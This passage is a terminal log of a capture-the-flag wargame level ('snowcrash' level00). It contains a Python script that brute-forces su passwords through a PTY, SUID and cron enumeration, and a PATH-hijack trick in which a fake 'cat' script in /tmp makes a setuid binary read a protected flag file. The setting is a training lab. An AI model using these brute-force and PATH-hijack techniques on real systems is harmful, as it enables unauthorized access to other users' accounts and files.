            pwd += chr((ord(c) - ord("a") + shift) % 26 + ord("a"))
        else:
            pwd += c
    passwords.append((shift, pwd))

found = False
for shift, pwd in passwords:
    pid, fd = pty.fork()
    if pid == 0:
        # Proceso hijo: ejecuta su
        os.execlp("su", "su", "flag00", "-c", "echo SUCCESS_CHECK")
    else:
        # Proceso padre: interactúa con el PTY de forma no bloqueante
        time.sleep(0.05)
        try:
            os.write(fd, (pwd + "\n").encode())
            output = ""
            end_time = time.time() + 0.4
            while time.time() < end_time:
                r, _, _ = select.select([fd], [], [], 0.05)
                if r:
                    chunk = os.read(fd, 1024).decode(errors="ignore")
                    if not chunk:
                        break
'   print("\n[-] Ninguna de las 26 rotaciones fue aceptada como contraseña por su.")

[-] Ninguna de las 26 rotaciones fue aceptada como contraseña por su.
level00@snowcrash:~$ python3 -c '
s = "f2av5il02puano7naaf6adaf3a"
for shift in range(26):
    res = "".join(chr((ord(c) - 97 + shift) % 26 + 97) if "a" <= c <= "z" else c for c in s)
    print(f"ROT-{shift:02d}: {res}")
'
ROT-00: f2av5il02puano7naaf6adaf3a
ROT-01: g2bw5jm02qvbop7obbg6bebg3b
ROT-02: h2cx5kn02rwcpq7pcch6cfch3c
ROT-03: i2dy5lo02sxdqr7qddi6dgdi3d
ROT-04: j2ez5mp02tyers7reej6ehej3e
ROT-05: k2fa5nq02uzfst7sffk6fifk3f
ROT-06: l2gb5or02vagtu7tggl6gjgl3g
ROT-07: m2hc5ps02wbhuv7uhhm6hkhm3h
ROT-08: n2id5qt02xcivw7viin6ilin3i
ROT-09: o2je5ru02ydjwx7wjjo6jmjo3j
ROT-10: p2kf5sv02zekxy7xkkp6knkp3k
ROT-11: q2lg5tw02aflyz7yllq6lolq3l
ROT-12: r2mh5ux02bgmza7zmmr6mpmr3m
ROT-13: s2ni5vy02chnab7anns6nqns3n
ROT-14: t2oj5wz02diobc7boot6orot3o
ROT-15: u2pk5xa02ejpcd7cppu6pspu3p
ROT-16: v2ql5yb02fkqde7dqqv6qtqv3q
ROT-17: w2rm5zc02glref7errw6rurw3r
ROT-18: x2sn5ad02hmsfg7fssx6svsx3s
ROT-19: y2to5be02intgh7gtty6twty3t
ROT-20: z2up5cf02jouhi7huuz6uxuz3u
ROT-21: a2vq5dg02kpvij7ivva6vyva3v
ROT-22: b2wr5eh02lqwjk7jwwb6wzwb3w
ROT-23: c2xs5fi02mrxkl7kxxc6xaxc3x
ROT-24: d2yt5gj02nsylm7lyyd6ybyd3y
ROT-25: e2zu5hk02otzmn7mzze6zcze3z
level00@snowcrash:~$ echo "f2av5il02puano7naaf6adaf3a" | tr 'a-zA-Z' 'p-za-oP-ZA-O'
u2pk5xa02ejpcd7cppu6pspu3p
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ find / -user flag00 2>/dev/null
/home/flag00
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ type -a cat echo read pwd
cat is /usr/bin/cat
cat is /bin/cat
echo is a shell builtin
echo is /usr/bin/echo
echo is /bin/echo
read is a shell builtin
pwd is a shell builtin
pwd is /usr/bin/pwd
pwd is /bin/pwd
level00@snowcrash:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
level00@snowcrash:~$ help
GNU bash, version 5.2.21(1)-release (x86_64-pc-linux-gnu)
These shell commands are defined internally.  Type `help' to see this list.
Type `help name' to find out more about the function `name'.
Use `info bash' to find out more about the shell in general.
Use `man -k' or `info' to find out more about commands not in this list.

A star (*) next to a name means that the command is disabled.

 job_spec [&]                                                                                                             history [-c] [-d offset] [n] or history -anrw [filename] or history -ps arg [arg...]
 (( expression ))                                                                                                         if COMMANDS; then COMMANDS; [ elif COMMANDS; then COMMANDS; ]... [ else COMMANDS; ] fi
 . filename [arguments]                                                                                                   jobs [-lnprs] [jobspec ...] or jobs -x command [args]
 :                                                                                                                        kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec]
 [ arg... ]                                                                                                               let arg [arg ...]
 [[ expression ]]                                                                                                         local [option] name[=value] ...
 alias [-p] [name[=value] ... ]                                                                                           logout [n]
 bg [job_spec ...]                                                                                                        mapfile [-d delim] [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array]
 bind [-lpsvPSVX] [-m keymap] [-f filename] [-q name] [-u name] [-r keyseq] [-x keyseq:shell-command] [keyseq:readline->  popd [-n] [+N | -N]
 break [n]                                                                                                                printf [-v var] format [arguments]
 builtin [shell-builtin [arg ...]]                                                                                        pushd [-n] [+N | -N | dir]
 caller [expr]                                                                                                            pwd [-LP]
 case WORD in [PATTERN [| PATTERN]...) COMMANDS ;;]... esac                                                               read [-ers] [-a array] [-d delim] [-i text] [-n nchars] [-N nchars] [-p prompt] [-t timeout] [-u fd] [name ...]
 cd [-L|[-P [-e]] [-@]] [dir]                                                                                             readarray [-d delim] [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array]
 command [-pVv] command [arg ...]                                                                                         readonly [-aAf] [name[=value] ...] or readonly -p
 compgen [-abcdefgjksuv] [-o option] [-A action] [-G globpat] [-W wordlist] [-F function] [-C command] [-X filterpat] [>  return [n]
 complete [-abcdefgjksuv] [-pr] [-DEI] [-o option] [-A action] [-G globpat] [-W wordlist] [-F function] [-C command] [->  select NAME [in WORDS ... ;] do COMMANDS; done
 compopt [-o|+o option] [-DEI] [name ...]                                                                                 set [-abefhkmnptuvxBCEHPT] [-o option-name] [--] [-] [arg ...]
 continue [n]                                                                                                             shift [n]
 coproc [NAME] command [redirections]                                                                                     shopt [-pqsu] [-o] [optname ...]
 declare [-aAfFgiIlnrtux] [name[=value] ...] or declare -p [-aAfFilnrtux] [name ...]                                      source filename [arguments]
 dirs [-clpv] [+N] [-N]                                                                                                   suspend [-f]
 disown [-h] [-ar] [jobspec ... | pid ...]                                                                                test [expr]
 echo [-neE] [arg ...]                                                                                                    time [-p] pipeline
 enable [-a] [-dnps] [-f filename] [name ...]                                                                             times
 eval [arg ...]                                                                                                           trap [-lp] [[arg] signal_spec ...]
 exec [-cl] [-a name] [command [argument ...]] [redirection ...]                                                          true
 exit [n]                                                                                                                 type [-afptP] name [name ...]
 export [-fn] [name[=value] ...] or export -p                                                                             typeset [-aAfFgiIlnrtux] name[=value] ... or typeset -p [-aAfFilnrtux] [name ...]
 false                                                                                                                    ulimit [-SHabcdefiklmnpqrstuvxPRT] [limit]
 fc [-e ename] [-lnr] [first] [last] or fc -s [pat=rep] [command]                                                         umask [-p] [-S] [mode]
 fg [job_spec]                                                                                                            unalias [-a] name [name ...]
 for NAME [in WORDS ... ] ; do COMMANDS; done                                                                             unset [-f] [-v] [-n] [name ...]
 for (( exp1; exp2; exp3 )); do COMMANDS; done                                                                            until COMMANDS; do COMMANDS-2; done
 function name { COMMANDS ; } or name () { COMMANDS ; }                                                                   variables - Names and meanings of some shell variables
 getopts optstring name [arg ...]                                                                                         wait [-fn] [-p var] [id ...]
 hash [-lr] [-p pathname] [-dt] [name ...]                                                                                while COMMANDS; do COMMANDS-2; done
 help [-dms] [pattern ...]                                                                                                { COMMANDS ; }
level00@snowcrash:~$ echo $SHELL; env
/bin/bash
SHELL=/bin/bash
PWD=/home/level00
LOGNAME=level00
XDG_SESSION_TYPE=tty
HOME=/home/level00
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:
SSH_CONNECTION=10.0.2.2 46562 10.0.2.15 4242
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=level00
SHLVL=1
XDG_SESSION_ID=9
XDG_RUNTIME_DIR=/run/user/1001
SSH_CLIENT=10.0.2.2 46562 4242
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
SSH_TTY=/dev/pts/0
_=/usr/bin/env
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ id flag00
uid=2000(flag00) gid=2000(flag00) groups=2000(flag00),1002(flaggroup)
level00@snowcrash:~$ find / -uid $(id -u flag00) 2>/dev/null
/home/flag00
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/opt/snowcrash/level06/raven
/opt/snowcrash/level07/snowcrash
/opt/snowcrash/level09/da5id
/opt/snowcrash/level10/enzo_runner
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ cat /etc/crontab /etc/cron.*/* 2>/dev/null
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
#!/bin/sh -e
# clean all crash reports which are older than a week.
[ -d /var/crash ] || exit 0
find /var/crash/. ! -name . -prune -type f \( \( -size 0 -a \! -name '*.upload*' -a \! -name '*.drkonqi*' \) -o -mtime +7 \) -exec rm -f -- '{}' \;
find /var/crash/. ! -name . -prune -type d -regextype posix-extended -regex '.*/[0-9]{12}$' \( -mtime +7 \) -exec rm -Rf -- '{}' \;
#!/bin/sh

set -e

# Systemd systems use a systemd timer unit which is preferable to
# run. We want to randomize the apt update and unattended-upgrade
# runs as much as possible to avoid hitting the mirrors all at the
# same time. The systemd time is better at this than the fixed
# cron.daily time
if [ -d /run/systemd/system ]; then
    exit 0
fi

check_power()
{
    # laptop check, on_ac_power returns:
    #       0 (true)    System is on main power
    #       1 (false)   System is not on main power
    #       255 (false) Power status could not be determined
    # Desktop systems always return 255 it seems
    if command -v on_ac_power >/dev/null; then
        if on_ac_power; then
            :
        elif [ $? -eq 1 ]; then
            return 1
        fi
    fi
    return 0
}

# sleep for a random interval of time (default 30min)
# (some code taken from cron-apt, thanks)
random_sleep()
{
    RandomSleep=1800
    eval $(apt-config shell RandomSleep APT::Periodic::RandomSleep)
    if [ $RandomSleep -eq 0 ]; then
	return
    fi
    if [ -z "$RANDOM" ] ; then
        # A fix for shells that do not have this bash feature.
	RANDOM=$(( $(dd if=/dev/urandom bs=2 count=1 2> /dev/null | cksum | cut -d' ' -f1) % 32767 ))
    fi
    TIME=$(($RANDOM % $RandomSleep))
    sleep $TIME
}

# delay the job execution by a random amount of time
random_sleep

# ensure we don't do this on battery
check_power || exit 0

# run daily job
exec /usr/lib/apt/apt.systemd.daily
#!/bin/sh

# Skip if systemd is running.
if [ -d /run/systemd/system ]; then
  exit 0
fi

/usr/libexec/dpkg/dpkg-db-backup
#!/bin/sh

# skip in favour of systemd timer
if [ -d /run/systemd/system ]; then
    exit 0
fi

# this cronjob persists removals (but not purges)
if [ ! -x /usr/sbin/logrotate ]; then
    exit 0
fi

/usr/sbin/logrotate /etc/logrotate.conf
EXITVALUE=$?
if [ $EXITVALUE != 0 ]; then
    /usr/bin/logger -t logrotate "ALERT exited abnormally with [$EXITVALUE]"
fi
exit $EXITVALUE
#!/bin/sh
#
# man-db cron daily

set -e

if [ -d /run/systemd/system ]; then
    # Skip in favour of systemd timer.
    exit 0
fi

# This should be set by cron, but apparently isn't always; see
# https://bugs.debian.org/209185.  Add fallbacks so that start-stop-daemon
# can be found.
export PATH="$PATH:/usr/local/sbin:/usr/sbin:/sbin"

iosched_idle=
# Don't try to change I/O priority in a vserver or OpenVZ.
if ! grep -Eq '(envID|VxID):.*[1-9]' /proc/self/status && \
   { [ ! -d /proc/vz ] || [ -d /proc/bc ]; }; then
    iosched_idle='--iosched idle'
fi

if ! [ -d /var/cache/man ]; then
    # Recover from deletion, per FHS.
    install -d -o man -g man -m 0755 /var/cache/man
fi

# expunge old catman pages which have not been read in a week
if [ -d /var/cache/man ]; then
  cd /
  # shellcheck disable=SC2086
  start-stop-daemon --start --pidfile /dev/null --startas /bin/sh \
	--oknodo --chuid man $iosched_idle -- -c \
	"find /var/cache/man -type f -name '*.gz' -atime +6 -print0 | \
	 xargs -r0 rm -f"
fi

# regenerate man database
if [ -x /usr/bin/mandb ]; then
    # --pidfile /dev/null so it always starts; mandb isn't really a daemon,
    # but we want to start it like one.
    # shellcheck disable=SC2086
    start-stop-daemon --start --pidfile /dev/null \
		      --startas /usr/bin/mandb --oknodo --chuid man \
		      $iosched_idle \
		      -- --no-purge --quiet
fi

exit 0
#!/bin/sh
# Generate a daily summary of process accounting.  Since this will probably
# get kicked off in the morning, it is run against the previous day data.

set -e

# Our configuration file
DEFAULT=/etc/default/sysstat
# Default settings, overridden in the above file
ENABLED=false

# Skip in favour of systemd timer
[ ! -d /run/systemd/system ] || exit 0

[ -x /usr/lib/sysstat/sa2 ] || exit 0

# Read our config
[ -r "$DEFAULT" ] && . "$DEFAULT"

[ "$ENABLED" = "true" ]  || exit 0

exec /usr/lib/sysstat/sa2 -A
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
# The first element of the path is a directory where the debian-sa1
# script is located
PATH=/usr/lib/sysstat:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin

# Activity reports every 10 minutes everyday
5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1

# Additional run at 23:59 to rotate the statistics file
59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
#!/bin/sh
#
# man-db cron weekly

set -e

if [ -d /run/systemd/system ]; then
    # Skip in favour of systemd timer.
    exit 0
fi

# This should be set by cron, but apparently isn't always; see
# https://bugs.debian.org/209185.  Add fallbacks so that start-stop-daemon
# can be found.
export PATH="$PATH:/usr/local/sbin:/usr/sbin:/sbin"

iosched_idle=
# Don't try to change I/O priority in a vserver or OpenVZ.
if ! grep -Eq '(envID|VxID):.*[1-9]' /proc/self/status && \
   { [ ! -d /proc/vz ] || [ -d /proc/bc ]; }; then
    iosched_idle='--iosched idle'
fi

if ! [ -d /var/cache/man ]; then
    # Recover from deletion, per FHS.
    install -d -o man -g man -m 0755 /var/cache/man
fi

# regenerate man database
if [ -x /usr/bin/mandb ]; then
    # --pidfile /dev/null so it always starts; mandb isn't really a daemon,
    # but we want to start it like one.
    # shellcheck disable=SC2086
    start-stop-daemon --start --pidfile /dev/null \
		      --startas /usr/bin/mandb --oknodo --chuid man \
		      $iosched_idle \
		      -- --quiet
fi

exit 0
level00@snowcrash:~$ sudo -l 2>/dev/null
[sudo] password for level00: 
level00@snowcrash:~$ strace /opt/snowcrash/level00/hiro 2>&1 | grep -E "euid|uid|exec|open|read|write"
execve("/opt/snowcrash/level00/hiro", ["/opt/snowcrash/level00/hiro"], 0x7ffd68301920 /* 22 vars */) = 0
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
openat(AT_FDCWD, "/etc/snowcrash/hiro.conf", O_RDONLY) = -1 ENOENT (No such file or directory)
getuid()                                = 1001
geteuid()                               = 1001
openat(AT_FDCWD, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3
read(3, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 526
read(3, "", 4096)                       = 0
openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3
read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 3505
openat(AT_FDCWD, "/var/log/snowcrash/hiro.log", O_WRONLY|O_CREAT|O_APPEND, 0640) = -1 EACCES (Permission denied)
write(1, "[*] Checking credentials...\n[*] "..., 87[*] Checking credentials...
^Z
[3]+  Stopped                 strace /opt/snowcrash/level00/hiro 2>&1 | grep --color=auto -E "euid|uid|exec|open|read|write"
level00@snowcrash:~$ echo '#!/bin/sh' > /tmp/cat
echo 'cat /home/flag00/.flag > /tmp/out.txt' >> /tmp/cat
chmod +x /tmp/cat
level00@snowcrash:~$ PATH=/tmp:$PATH /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ cat /tmp/out.txt 2>/dev/null
cat: permission denied
flag00@snowcrash:~$ exit
logout
level00@snowcrash:~$ mount | grep nosuid
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=965732k,nr_inodes=241433,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=201496k,mode=755,inode64)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k,inode64)
cgroup2 on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,nosuid,nodev,relatime,pagesize=2M)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,nosuid,nodev,noexec,relatime)
tracefs on /sys/kernel/tracing type tracefs (rw,nosuid,nodev,noexec,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,nosuid,nodev,noexec,relatime)
configfs on /sys/kernel/config type configfs (rw,nosuid,nodev,noexec,relatime)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=201492k,nr_inodes=50373,mode=700,uid=1001,gid=1003,inode64)
level00@snowcrash:~$ find / -user flag00 2>/dev/null
find / -group flaggroup 2>/dev/null
/home/flag00
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ ls -la /var/log/
ls -la /tmp/
total 1188
drwxrwxr-x  13 root        syslog            4096 Sep 26 00:24 .
drwxr-xr-x  13 root        root              4096 Jun  9 19:02 ..
-rw-r--r--   1 root        root                 0 Jun  9 19:04 alternatives.log
-rw-r-----   1 root        adm                  0 Jun  9 19:04 apport.log
drwxr-xr-x   2 root        root              4096 Jun  9 19:02 apt
-rw-r-----   1 syslog      adm              57834 Sep 26 01:05 auth.log
drwxr-xr-x   2 flag04      root              4096 Jun  9 19:03 babel
-rw-r--r--   1 root        root                 0 Jun  9 19:04 bootstrap.log
-rw-rw----   1 root        utmp             37248 Sep 26 01:00 btmp
-rw-r-----   1 syslog      adm                  0 Jun  9 19:04 cloud-init.log
-rw-r-----   1 root        adm                  0 Jun  9 19:04 cloud-init-output.log
drwxr-xr-x   2 root        root              4096 Jan 19  2026 dist-upgrade
-rw-r-----   1 root        adm              43186 Sep 26 00:24 dmesg
-rw-r-----   1 root        adm              43486 Jun  9 19:02 dmesg.0
-rw-r--r--   1 root        root                 0 Jun  9 19:04 dpkg.log
-rw-r--r--   1 root        root                 0 Feb 10  2026 faillog
drwxrwx---   4 root        adm               4096 Jun  9 19:02 installer
drwxr-sr-x+  3 root        systemd-journal   4096 Jun  9 19:02 journal
drwxr-x---   2 flagbonus04 flagbonus04       4096 Jun  9 19:04 juanita
-rw-r-----   1 syslog      adm              50928 Sep 26 00:24 kern.log
drwxr-xr-x   2 landscape   landscape         4096 Feb 10  2026 landscape
-rw-rw-r--   1 root        utmp            292584 Sep 25 23:11 lastlog
drwx------   2 root        root              4096 Feb 10  2026 private
lrwxrwxrwx   1 root        root                39 Feb 10  2026 README -> ../../usr/share/doc/systemd/README.logs
drwxr-xr-x   2 root        root              4096 Jun  9 19:03 snowcrash
-rw-r-----   1 syslog      adm             866058 Sep 26 01:06 syslog
drwxr-xr-x   2 root        root              4096 Sep 26 00:24 sysstat
drwxr-x---   2 root        adm               4096 Jun  9 19:02 unattended-upgrades
-rw-rw-r--   1 root        utmp             34560 Sep 25 23:11 wtmp
total 64
drwxrwxrwt 14 root    root    4096 Sep 26 01:06 .
drwxr-xr-x 23 root    root    4096 Jun  9 19:00 ..
-rwxrwxr-x  1 level00 level00   48 Sep 26 01:03 cat
drwxrwxrwt  2 root    root    4096 Sep 26 00:24 .font-unix
drwxrwxrwt  2 root    root    4096 Sep 26 00:24 .ICE-unix
-rw-r--r--  1 flag02  flag02    27 Sep 26 00:24 kourier_delivery.tmp
drwx------  2 root    root    4096 Sep 26 00:24 snap-private-tmp
drwx------  3 root    root    4096 Sep 25 22:46 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-fwupd.service-hKVJ5p
drwx------  3 root    root    4096 Sep 26 00:24 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-ModemManager.service-hhxHeJ
drwx------  3 root    root    4096 Sep 26 00:24 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-polkit.service-NOljiE
drwx------  3 root    root    4096 Sep 26 00:24 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-systemd-logind.service-3C7qxJ
drwx------  3 root    root    4096 Sep 26 00:24 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-systemd-resolved.service-adKDa6
drwx------  3 root    root    4096 Sep 26 00:24 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-systemd-timesyncd.service-IcxCzC
drwx------  3 root    root    4096 Sep 25 22:46 systemd-private-afd07b3a674a4aa7bf1a9cc69cee4e7b-upower.service-QgNfYI
drwxrwxrwt  2 root    root    4096 Sep 26 00:24 .X11-unix
drwxrwxrwt  2 root    root    4096 Sep 26 00:24 .XIM-unix
level00@snowcrash:~$ ps aux | grep flag00
level00    10660  0.0  0.5  18180 10832 pts/0    T    00:37   0:00 python3 -c  import pty, os, time, select  passwords = [     "f2av5il02puano7naaf6adaf3a",     "g3bw6jm13qvbop8obbg7bebg4b", "h4cx7kn24rwcpq9pcch8cfch5c",     "i5dy8lo35sxdqraqddi9dgdi6d", "j6ez9mp46tyersbreejaehej7e",     "k7f0anq57uzfstcsffkbfifk8f", "l8g1bor68v0gtudtgglcgjgl9g",     "m9h2cps79w1huveuhhmdhkhmah", "nai3dqt8ax2ivwfviineilinbi",     "obj4eru9by3jwxgwjjofjmjocj", "pck5fsvacz4kxyhxkkpgknkpdk",     "qdl6gtwbd05lyziyllqhlolqel", "rem7huxce16mz0jzmmrimpmrfm",     "sfn8ivydf27n01k0nnsjnqnsgn", "tgo9jwzeg38o12l1ootkorotho",     "uhpakx0fh49p23m2ppulpspuip", "viqbly1gi5aq34n3qqvmqtqvjq",     "wjrcmz2hj6br45o4rrwnrurwkr", "xksdn03ik7cs56p5ssxosvsxls",     "ylteo14jl8dt67q6ttyptwtymt", "zmufp25km9eu78r7uuzquxuznu",     "0nvgq36lnafv89s8vv0rvyv0ov", "1owhr47mobgw9at9ww1swzw1pw",     "2pxis58npchxabuaxx2tx0x2qx", "3qyjt69oqdiybcvbyy3uy1y3ry",     "4rzku7aprejzcdwczz4vz2z4sz", "5s0lv8bqsfk0dexd005w0305t0",     "6t1mw9crtgl1efye116x1416u1", "7u2nxadsuhm2fgzf227y2527v2",     "8v3oybetvin3gh0g338z3638w3", "9w4pzcfuwjo4hi1h44904749x4",     "ax5q0dgvxkp5ij2i55a1585ay5", "by6r1ehwylq6jk3j66b2696bz6",     "cz7s2fixzmr7kl4k77c37a7c07", "d08t3gjy0ns8lm5l88d48b8d18",     "e19u4hkz1ot9mn6m99e59c9e29" ]  found = False for pwd in passwords:     pid, fd = pty.fork()     if pid == 0:         os.execlp("su", "su", "flag00", "-c", "echo SUCCESS_FLAG00")     else:         time.sleep(0.1)         os.write(fd, (pwd + "\n").encode())         output = ""         end_time = time.time() + 0.8         while time.time() < end_time:             r, _, _ = select.select([fd], [], [], 0.1)             if r:                 try:                     data = os.read(fd, 1024).decode(errors="ignore")                     if not data: break                     output += data                 except: break         os.close(fd)         os.waitpid(pid, 0)         if "SUCCESS_FLAG00" in output:             print(f"\n[+] ¡CONTRASEÑA EXACTA ENCONTRADA!: {pwd}")             found = True             break  if not found:     print("\n[-] Ninguna de estas variantes fue aceptada por su.") 
